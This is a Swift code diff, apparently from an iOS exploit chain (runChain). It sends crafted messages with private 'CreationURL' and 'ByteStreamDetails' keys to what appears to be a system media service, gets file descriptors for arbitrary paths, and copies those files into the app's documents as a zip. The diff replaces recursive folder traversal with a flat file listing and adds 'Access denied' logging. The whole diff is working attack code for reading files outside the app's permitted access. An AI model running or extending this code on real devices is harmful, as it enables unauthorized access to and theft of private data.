@@ -35,10 +35,6 @@ private final class EHBox {
     var seen = false
 }
 
-private final class ProgressStats {
-    var totalBytes: Int64 = 0
-}
-
 private func releaseFigReference(_ pointer: UnsafeMutableRawPointer?) {
     guard let pointer else { return }
     Unmanaged<CFTypeRef>.fromOpaque(pointer).release()
@@ -455,6 +451,53 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
         }
     }
 
+    /// Перечисляет папку и возвращает обычные файлы
+    func getFilesInDirectory(fd: Int32) -> [String] {
+        guard let directory = fdopendir(fd) else {
+            let savedErrno = errno
+            close(fd)
+            logLine("Directory stream creation failed: errno=\(savedErrno)")
+            return []
+        }
+        defer { closedir(directory) }
+
+        let directoryFD = dirfd(directory)
+        var fileNames: [String] = []
+
+        while true {
+            errno = 0
+            guard let entry = readdir(directory) else { break }
+            let name = directoryEntryName(entry)
+            if name == "." || name == ".." { continue }
+
+            var isRegularFile = false
+            var itemStat = stat()
+            let statResult = name.withCString {
+                fstatat(directoryFD, $0, &itemStat, AT_SYMLINK_NOFOLLOW)
+            }
+            
+            if statResult == 0 {
+                if (itemStat.st_mode & mode_t(S_IFMT)) == mode_t(S_IFREG) {
+                    isRegularFile = true
+                }
+            } else {
+                let dType = entry.pointee.d_type
+                if dType == UInt8(DT_REG) {
+                    isRegularFile = true
+                } else if dType != UInt8(DT_DIR) && dType != 4 {
+                    isRegularFile = true
+                }
+            }
+
+            if isRegularFile {
+                fileNames.append(name)
+            }
+        }
+
+        fileNames.sort { $0.localizedStandardCompare($1) == .orderedAscending }
+        return fileNames
+    }
+
     // Сохраняет одиночный файл
     func saveFile(fd: Int32, outputName: String) {
         defer { close(fd) }
@@ -493,17 +536,20 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
         let cfURL = URL(fileURLWithPath: path) as CFURL
         var msg: UnsafeMutableRawPointer? = nil
         guard fBasic(0x4375726c, 0, &msg) == 0, let m = msg else {
-            return nil
+            logLine("Request message failed for: \(path)"); return nil
         }
         _ = fSetURL(m, "CreationURL", Unmanaged.passUnretained(cfURL).toOpaque())
         fSetU64(OpaquePointer(m), "FileOpenOptions", 0)
         let (rp, rt) = send(m)
         fRel(OpaquePointer(m))
         guard rt == "dictionary", let rp = rp else {
+            logLine("Request failed for \(path): \(rt)")
             if let rp = rp { fRel(rp) }
             return nil
         }
         guard let details = fVal(rp, "ByteStreamDetails") else {
+            let err = fI64(rp, ".ErrorReturn")
+            logLine("Access denied for \(path) (\(err))")
             fRel(rp)
             return nil
         }
@@ -530,95 +576,41 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
                 let fileType = st.st_mode & mode_t(S_IFMT)
                 if fileType == mode_t(S_IFDIR) {
                     logLine("Target is a directory.")
+                    let fileNames = getFilesInDirectory(fd: initialFd)
                     close(initialFd)
 
                     let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
-                    let rootFolderURL = tempDir.appendingPathComponent(outputName)
-                    
                     do {
-                        try FileManager.default.createDirectory(at: rootFolderURL, withIntermediateDirectories: true)
+                        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
                     } catch {
                         logLine("Failed to create temp directory: \(error.localizedDescription)")
                         return
                     }
 
-                    let stats = ProgressStats()
+                    var totalBytesRead: Int64 = 0
+                    let basePath = targetPath.hasSuffix("/") ? targetPath : targetPath + "/"
 
-                    // Рекурсивная функция обхода папок с защитой от сбоев
-                    func processDirectory(remotePath: String, localDestinationDir: URL) {
-                        guard let dirFd = probe(remotePath) else { return }
-                        defer { close(dirFd) }
-                        
-                        guard let directory = fdopendir(dirFd) else { return }
-                        defer { closedir(directory) }
-                        
-                        let directoryFD = dirfd(directory)
-                        
-                        while true {
-                            errno = 0
-                            guard let entry = readdir(directory) else { break }
-                            let name = directoryEntryName(entry)
-                            if name == "." || name == ".." { continue }
-                            
-                            var isDir = false
-                            var isFile = false
-                            
-                            var itemStat = stat()
-                            let statResult = name.withCString {
-                                fstatat(directoryFD, $0, &itemStat, AT_SYMLINK_NOFOLLOW)
-                            }
-                            
-                            if statResult == 0 {
-                                let mode = itemStat.st_mode & mode_t(S_IFMT)
-                                if mode == mode_t(S_IFREG) {
-                                    isFile = true
-                                } else if mode == mode_t(S_IFDIR) {
-                                    isDir = true
-                                }
-                            } else {
-                                let dType = entry.pointee.d_type
-                                if dType == UInt8(DT_REG) {
-                                    isFile = true
-                                } else if dType == UInt8(DT_DIR) || dType == 4 {
-                                    isDir = true
-                                }
-                            }
-                            
-                            let childRemotePath = (remotePath.hasSuffix("/") ? remotePath : remotePath + "/") + name
-                            let childLocalURL = localDestinationDir.appendingPathComponent(name)
-                            
-                            if isFile {
-                                if let fileFd = probe(childRemotePath) {
-                                    var stFile = stat()
-                                    if fstat(fileFd, &stFile) == 0 {
-                                        let size = Int64(stFile.st_size)
-                                        if size > 0 && size <= Int64(Int.max) {
-                                            var buffer = [UInt8](repeating: 0, count: Int(size))
-                                            let count = pread(fileFd, &buffer, buffer.count, 0)
-                                            if count > 0 {
-                                                do {
-                                                    try FileManager.default.createDirectory(at: localDestinationDir, withIntermediateDirectories: true)
-                                                    try Data(buffer.prefix(count)).write(to: childLocalURL, options: .atomic)
-                                                    stats.totalBytes += Int64(count)
-                                                } catch {}
-                                            }
-                                        }
+                    for name in fileNames {
+                        let fullFilePath = basePath + name
+                        if let fileFd = probe(fullFilePath) {
+                            var stFile = stat()
+                            if fstat(fileFd, &stFile) == 0 {
+                                let size = Int64(stFile.st_size)
+                                if size > 0 && size <= Int64(Int.max) {
+                                    var buffer = [UInt8](repeating: 0, count: Int(size))
+                                    let count = pread(fileFd, &buffer, buffer.count, 0)
+                                    if count > 0 {
+                                        let fileURL = tempDir.appendingPathComponent(name)
+                                        do {
+                                            try Data(buffer.prefix(count)).write(to: fileURL, options: .atomic)
+                                            totalBytesRead += Int64(count)
+                                        } catch {}
                                     }
-                                    close(fileFd)
                                 }
-                            } else if isDir {
-                                do {
-                                    try FileManager.default.createDirectory(at: childLocalURL, withIntermediateDirectories: true)
-                                } catch {
-                                    continue
-                                }
-                                processDirectory(remotePath: childRemotePath, localDestinationDir: childLocalURL)
                             }
+                            close(fileFd)
                         }
                     }
-
-                    // Запуск рекурсивного чтения
-                    processDirectory(remotePath: targetPath, localDestinationDir: rootFolderURL)
 
                     let zipFilename = outputName + ".zip"
                     let destinationZipURL = docs.appendingPathComponent(zipFilename)
@@ -640,7 +632,7 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
                     try? FileManager.default.removeItem(at: tempDir)
 
                     if successZip {
-                        logLine("Saved \(stats.totalBytes) bytes: \(zipFilename)")
+                        logLine("Saved \(totalBytesRead) bytes: \(zipFilename)")
                     } else {
                         logLine("Failed to create zip archive")
                     }
